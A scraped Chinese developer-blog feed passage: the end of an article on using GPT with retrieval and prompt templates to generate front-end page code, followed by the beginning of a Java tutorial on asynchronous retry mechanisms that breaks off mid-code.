<p>首先是知识库存储。由于 SDK 的数量较大，每个 SDK 都包含描述其功能的文本和示例代码。为了解决分块时 SDK 被截断的问题，我们将 SDK 的描述单独分块并进行向量化存储。</p>
<p>其次，如何从需求 PRD 中精准匹配到需要调用的 SDK。由于 Checklist 中包含了大量的业务描述，这些描述对于 SDK 的匹配很多干扰项。因此，我们让 GPT 对 checklist 的数据进行拆解和任务识别，识别出类似于接口调用、环境判断和埋点等功能点，将需求文档转化为与 SDK 更匹配的功能描述，形成 query list。然后，我们用每个 query 去向量数据库中匹配，找出最相关的 TOP5 结果。</p>
<p>最后，由于 TOP5 结果对后续代码生成仍有干扰，我们引入了 BGE Reranker large model 进行进一步排序，获取最匹配的结果。所有 query 完成这一步后，我们再让 GPT 帮助我们进行去重和匹配度确认，最终输出一个相关度较高的 query 和 sdk 集合。</p>
<p>将这份集合与前面的需求 Checklist 数据、渲染代码以及后端接口 API 数据结合起来，我们就可以进行整个逻辑代码的生成。GPT 生成的结果包括私有 SDK 引用、接口调用、交互行为（如 Tab 切换、点击后的页面跳转等），以及渲染部分。</p>
<h3 data-id="heading-18">3、小结</h3>
<p>在 C 端的应用效果方面，我们可以看到出码率的计算结果有所不同，这取决于各类业务场景。一些场景的出码率较高，这些通常包括样式规整的页面，比如列表循环等。这些页面的结构和样式较为标准化，因此更容易被自动化工具识别和生成。</p>
<p>相对而言，出码率较低的场景可能涉及到复杂的图表、隐藏的业务逻辑，或者动画。例如，一些页面可能包含复杂的动画效果，如“拍一拍”按钮的动态效果，或者轮播图等。这些动画效果目前不在我们的代码生成范围内，因此这些页面的出码率相对较低。</p>
<h3 data-id="heading-19">4、B 端业务场景解决方案</h3>
<p>从系统架构图可以看出，我们选择了利用 AI 技术来进行代码生成。我们构建了一整套系统，这套系统不仅包括代码生成，还涉及到从项目维度对代码进行管理，包括项目中包含的页面以及这些页面的所有代码。</p>
<p>我们的系统覆盖了项目的整个生命周期，从代码生成到项目的整体发布，包括 Beta 测试、部署、线上部署，以及图片的 CDN 上传和代码的回滚等一整套解决方案。这些功能都在我们的系统中得到了集成和管理。篇幅有限，这里主要关注代码生成这一部分。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/432198e549f84a95a2738fb897513772~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=wgK%2FwzByGSENDpNVo42PJf5e5%2Bc%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20">六、B 端代码生成</h2>
<h3 data-id="heading-21">1、页面提示词的编写</h3>
<p>在 B 端代码生成，比如生成这样一个包含表单和表格的页面，我们提示词是如何编写的呢。</p>
<p>首先，我们会编写一些系统预设，这些预设包括设定角色为资深前端开发工程师，使用的框架可能是 Ant Design V4、Mobx 等。我们还会设定一些限制，比如生成注释的要求、生成文件要求、代码格式规范，以及 workflows 的输入输出规范。这些预设可以根据需求做调整。</p>
<p>用户 prompt 部分，是我们对需求的描述。以这个案例为例，我们首先进行业务抽象，然后结合接口信息用 Markdown 格式描述整个功能模块。例如，如果页面中有一个表单，我们就直接描述它是一个表单，并详细说明表单的元素，如角色名称的 key 和类型是什么。如果有一个按钮，我们描述按钮的点击交互，点击后调用的接口是什么，接口的地址、参数和返回数据是什么。拿到接口数据后，我们如何渲染表格，表格是否需要分页，列名是什么，对应的字段又是什么。</p>
<p>实际的需求应用过程中，我们会遇到下面这些问题：</p>
<ol>
<li>
<p>提示词编写成本高。如果让一个新同学去编写提示词，他可能不知道应该使用什么格式或者方式来正确描述需求，导致提示词的编写成本很高。提示词的质量与最终代码生成的质量密切相关。因此，我们需要解决提示词编写成本的问题。</p>
</li>
<li>
<p>无法使用私有代码库。B 端系统需要使用我们自己的业务代码库，我们需要让 GPT 在生成的代码中使用这些代码库。</p>
</li>
<li>
<p>复杂页面生成代码质量差。我们需要找到一种有效方式来描述功能复杂的页面，以便 GPT 能够准确地生成所需的代码。</p>
</li>
</ol>
<h3 data-id="heading-22">2、提示词编写效率提升</h3>
<p>为了提升提示词编写的效率，我们提供了两种方案。</p>
<p>第一种方案是根据接口 API 自动生成提示词，主要针对表单和表格这两种场景。我们会提供一份提示词的示例作为上下文，并结合用户输入的接口信息来自动生成提示词。选择表单和表格是因为请求参数往往来源于表单数据，而返回数据中的 list 结构通常用于渲染表格，所以我们可以根据接口信息自动生成相应的提示词。开发人员只需将自动生成的提示词与自己的需求进行比对，如有需要，进行增删改，这样的修改成本相比从头开始写可以降低至少 60%。</p>
<p>第二种方案是提供一些常见的提示词模板。这些模板适用于复杂的表单、表格、树形结构、图表等场景。开发人员可以直接使用这些模板，并根据具体需求进行一些修改。提示词模板也能给开发编写提示词带来极大提效。</p>
<h3 data-id="heading-23">3、私有组件代码库应用</h3>
<p>在我们的业务场景中，私有组件库的应用采用了 few-shot prompting 的方案。我们会向用户提供一个代码库列表，用户选择代码库后，我们会将所选代码库的示例作为提示词的上下文提供给 GPT，以便 GPT 能够根据这些信息生成代码。采用这种方法主要是因为目前在我们的 B 端业务场景中，代码库的组件数不多，如果后续代码组件数量非常多，我们也会考虑使用 RAG 方案。</p>
<h3 data-id="heading-24">4、复杂页面生成</h3>
<p>在处理复杂页面的代码生成时，我们采取了一种化繁为简的策略。比如这个页面，包含 6 个功能模块和 4 个后端接口。如果在一个 prompt 中描述这 6 个模块的内容、模块间的调用关系以及与接口的交互，prompt 会非常长，这样长的 prompt 给到 GPT，生成的代码质量并不理想。为了解决这个问题，我们的解决方案是将页面拆分成单独的模块，通过编排的交互方式，描述模块间的引用关系，然后对每个模块单独进行代码生成。这种方法比整体生成的质量要高很多，因为我们更精细地控制每个模块的生成过程。</p>
<h3 data-id="heading-25">5、组件编排</h3>
<p>我们开发的编排界面是实现组件编排的核心工具。在这个过程中，需要人工手动拆分模块，识别并定义模块间的调用关系。我们会先对子模块进行代码生成，然后将子模块的代码作为上下文，结合父组件的提示词来生成父组件的代码。这种逐个模块的代码生成方法确保了每个模块的代码都是高质量的。</p>
<p>在所有模块的代码生成完成后，我们会进入在线页面编辑器，这里包含了所有模块的文件，每个文件都已经完成了拆分。左侧是在线编辑器，右侧是实时预览沙箱。这个例子里面的页面在 GPT 生成代码后，无需任何修改即可运行，可用度非常高。在这个页面上，我们对比需求 PRD，检查功能是否有遗漏，或者是否有业务逻辑偏差。功能补充完整后，我们可以提交代码进行 Beta 发布和测试，并在测试完成后直接在系统上进行线上发布。</p>
<h3 data-id="heading-26">6、小结</h3>
<p>从 2 月到现在，我们 B 端的出码率整体呈上升趋势，已经有 100 多个页面上线，代码量达到几万行。出码率的提升得益于我们对提示词的优化、交互的优化，以及大模型的升级。</p>
<h2 data-id="heading-27">七、未来规划</h2>
<p>代码生成的持续发展上，主要包含以下三个方面：</p>
<ol>
<li>
<p>制定 UI 标准范式。开发与 UI 设计的协同工作对于生成高质量代码至关重要。</p>
</li>
<li>
<p>逻辑代码生成方面，我们之前讨论的主要是营销活动的逻辑代码。对于主流程，由于其历史业务逻辑较为复杂，我们仍在开发和探索过程中。</p>
</li>
<li>
<p>C2C（Code to Code），包含老旧系统重构和多端代码生成。</p>
</li>
</ol>
<p>系统的智能化提升，主要包含下面两点：</p>
<ol>
<li>
<p>我们将持续优化系统，提升系统的自动化能力以及交互模式，使其更加智能，降低对人工操作的依赖。</p>
</li>
<li>
<p>多模态智能生成的应用。在 C 端，我们比较期待随着大模型的发展，后续支持用 UI 设计稿直接生成还原度高且质量高的代码。对于 B 端，目前除了提示词外，还支持根据原型图生成页面，我们期待未来可以通过语音等多模态输入直接生成页面，实现更高效、更智能的代码生成，从而进一步提升开发效率。</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 异步调用失败导致系统崩溃？这份重试机制救了我]]></title>    <link>https://juejin.cn/post/7594322573453033515</link>    <guid>https://juejin.cn/post/7594322573453033515</guid>    <pubDate>2026-01-13T01:17:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453033515" data-draft-id="7583910418658295854" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 异步调用失败导致系统崩溃？这份重试机制救了我"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-13T01:17:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员大华"/> <meta itemprop="url" content="https://juejin.cn/user/3507878440995946"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 异步调用失败导致系统崩溃？这份重试机制救了我
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3507878440995946/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员大华
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:17:59.000Z" title="Tue Jan 13 2026 01:17:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.异步编程介绍</h2>
<h3 data-id="heading-1">什么是异步编程</h3>
<p>异步编程是一种非阻塞的编程模式，允许程序在等待某个操作完成时继续执行其他任务，而不是一直等待。</p>
<p>当操作完成后，通过回调函数、Future 或事件通知等方式获取结果。</p>
<p><strong>同步 vs 异步对比：</strong></p>
<ul>
<li><strong>同步</strong>：顺序执行，每一步必须等待前一步完成</li>
<li><strong>异步</strong>：非阻塞执行，可以同时处理多个任务</li>
</ul>
<h3 data-id="heading-2">Java 中的异步实现方式</h3>
<h4 data-id="heading-3">1. CompletableFuture (Java 8+)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建异步任务</span>
CompletableFuture&lt;String&gt; future = CompletableFuture.supplyAsync(() -&gt; {
    <span class="hljs-comment">// 模拟耗时操作</span>
    <span class="hljs-keyword">try</span> {
        Thread.sleep(<span class="hljs-number">1000</span>);
    } <span class="hljs-keyword">catch</span> (InterruptedException e) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">"异步任务结果"</span>;
});

<span class="hljs-comment">// 处理结果</span>
future.thenAccept(result -&gt; System.out.println(<span class="hljs-string">"结果: "</span> + result));
</code></pre>
<h4 data-id="heading-4">2. @Async 注解 (Spring Framework)</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AsyncService</span> {
    
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">asyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 异步执行的方法</span>
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"执行结果"</span>);
    }
}
</code></pre>
<h4 data-id="heading-5">3. 回调函数</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Callback</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onSuccess</span><span class="hljs-params">(String result)</span>;
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">onError</span><span class="hljs-params">(Exception e)</span>;
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">asyncOperation</span><span class="hljs-params">(Callback callback)</span> {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 模拟操作</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> doSomething();
            callback.onSuccess(result);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            callback.onError(e);
        }
    }).start();
}
</code></pre>
<h2 data-id="heading-6">2.异步编程中的常见错误</h2>
<h3 data-id="heading-7">2.1 网络相关错误</h3>
<ul>
<li>连接超时</li>
<li>读取超时</li>
<li>DNS 解析失败</li>
<li>网络不可达</li>
</ul>
<h3 data-id="heading-8">2.2 资源相关错误</h3>
<ul>
<li>内存不足</li>
<li>线程池耗尽</li>
<li>数据库连接超时</li>
</ul>
<h3 data-id="heading-9">2.3 业务逻辑错误</h3>
<ul>
<li>远程服务返回错误码</li>
<li>数据格式异常</li>
<li>业务规则校验失败</li>
</ul>
<h3 data-id="heading-10">2.4 示例：可能出错的异步方法</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnreliableService</span> {
    
    <span class="hljs-comment">// 模拟不可靠的远程服务调用</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">callExternalService</span><span class="hljs-params">(String data)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟随机错误</span>
            <span class="hljs-type">double</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> Math.random();
            <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.3</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"网络超时"</span>);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (random &lt; <span class="hljs-number">0.6</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"服务端错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"处理结果: "</span> + data;
        });
    }
}
</code></pre>
<h2 data-id="heading-11">3. 异步重试机制实现</h2>
<h3 data-id="heading-12">3.1 手动重试实现</h3>
<h4 data-id="heading-13">3.1.1 基础重试逻辑</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryAsync(task, maxAttempts, delayMs, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">retryAsync</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task, 
            <span class="hljs-type">int</span> maxAttempts, 
            <span class="hljs-type">long</span> delayMs, 
            <span class="hljs-type">int</span> attempt, 
            CompletableFuture&lt;T&gt; result)</span> {
        
        task.get().whenComplete((response, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                result.complete(response);
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
                result.completeExceptionally(throwable);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 延迟后重试</span>
                CompletableFuture.delayedExecutor(delayMs, TimeUnit.MILLISECONDS)
                    .execute(() -&gt; retryAsync(task, maxAttempts, delayMs, attempt + <span class="hljs-number">1</span>, result));
            }
        });
    }
}
</code></pre>
<h3 data-id="heading-14">3.2 使用 Spring Retry</h3>
<h4 data-id="heading-15">3.2.1 添加依赖</h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.retry<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-retry<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aspects<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.3.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h4 data-id="heading-16">3.2.2 配置重试模板</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@EnableRetry</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> RetryTemplate <span class="hljs-title function_">retryTemplate</span><span class="hljs-params">()</span> {
        <span class="hljs-type">RetryTemplate</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetryTemplate</span>();
        
        <span class="hljs-comment">// 重试策略：最多重试3次，遇到特定异常时重试</span>
        <span class="hljs-type">SimpleRetryPolicy</span> <span class="hljs-variable">retryPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleRetryPolicy</span>(<span class="hljs-number">3</span>, 
            Collections.singletonMap(RuntimeException.class, <span class="hljs-literal">true</span>));
        template.setRetryPolicy(retryPolicy);
        
        <span class="hljs-comment">// 退避策略：每次重试间隔1秒</span>
        <span class="hljs-type">FixedBackOffPolicy</span> <span class="hljs-variable">backOffPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedBackOffPolicy</span>();
        backOffPolicy.setBackOffPeriod(<span class="hljs-number">1000</span>);
        template.setBackOffPolicy(backOffPolicy);
        
        <span class="hljs-keyword">return</span> template;
    }
}
</code></pre>
<h4 data-id="heading-17">3.2.3 使用 @Retryable 注解</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryableService</span> {
    
    <span class="hljs-meta">@Retryable(
        value = {RuntimeException.class},
        maxAttempts = 3,
        backoff = @Backoff(delay = 1000)
    )</span>
    <span class="hljs-meta">@Async</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">retryableAsyncMethod</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.supplyAsync(() -&gt; {
            <span class="hljs-comment">// 模拟可能失败的操作</span>
            <span class="hljs-keyword">if</span> (Math.random() &lt; <span class="hljs-number">0.7</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"临时错误"</span>);
            }
            <span class="hljs-keyword">return</span> <span class="hljs-string">"成功结果"</span>;
        });
    }
    
    <span class="hljs-meta">@Recover</span>
    <span class="hljs-keyword">public</span> CompletableFuture&lt;String&gt; <span class="hljs-title function_">recover</span><span class="hljs-params">(RuntimeException e)</span> {
        <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(<span class="hljs-string">"降级结果"</span>);
    }
}
</code></pre>
<h3 data-id="heading-18">3.3 高级重试策略实现</h3>
<h4 data-id="heading-19">3.3.1 指数退避重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExponentialBackoffRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay)</span> {
        
        <span class="hljs-keyword">return</span> retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, <span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithExponentialBackoff</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            <span class="hljs-type">int</span> maxAttempts,
            <span class="hljs-type">long</span> initialDelay,
            <span class="hljs-type">long</span> maxDelay,
            <span class="hljs-type">int</span> attempt)</span> {
        
        CompletableFuture&lt;T&gt; future = task.get();
        
        <span class="hljs-keyword">if</span> (attempt &gt;= maxAttempts) {
            <span class="hljs-keyword">return</span> future;
        }
        
        <span class="hljs-keyword">return</span> future.handle((result, throwable) -&gt; {
            <span class="hljs-keyword">if</span> (throwable == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> CompletableFuture.completedFuture(result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 计算退避时间</span>
                <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> Math.min(maxDelay, initialDelay * (<span class="hljs-type">long</span>) Math.pow(<span class="hljs-number">2</span>, attempt - <span class="hljs-number">1</span>));
                
                <span class="hljs-comment">// 添加随机抖动避免惊群效应</span>
                delay = (<span class="hljs-type">long</span>) (delay * (<span class="hljs-number">0.5</span> + Math.random()));
                
                CompletableFuture&lt;T&gt; nextAttempt = CompletableFuture
                    .delayedExecutor(delay, TimeUnit.MILLISECONDS)
                    .supplyAsync(() -&gt; 
                        retryWithExponentialBackoff(task, maxAttempts, initialDelay, maxDelay, attempt + <span class="hljs-number">1</span>)
                    )
                    .thenCompose(cf -&gt; cf);
                
                <span class="hljs-keyword">return</span> nextAttempt;
            }
        }).thenCompose(cf -&gt; cf);
    }
}
</code></pre>
<h4 data-id="heading-20">3.3.2 基于条件的重试</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConditionalRetry</span> {
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; CompletableFuture&lt;T&gt; <span class="hljs-title function_">retryWithCondition</span><span class="hljs-params">(
            Supplier&lt;CompletableFuture&lt;T&gt;&gt; task,
            Predicate&lt;Throwable&gt; shouldRetry,
            <span class="hljs-type">int</span> maxAttempts,
            Function&lt;Integer, Long&gt; delayCalculator)</span> {
        
        CompletableFuture&lt;T&gt; result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompletableFuture</span>&lt;&gt;();
        retryWithCondition(task, shouldRetry, maxAttempts, delayCalculator, <span class="hljs-number">1</span>, result);
        <span class="hljs-keyword">return</span> result;
    }
    
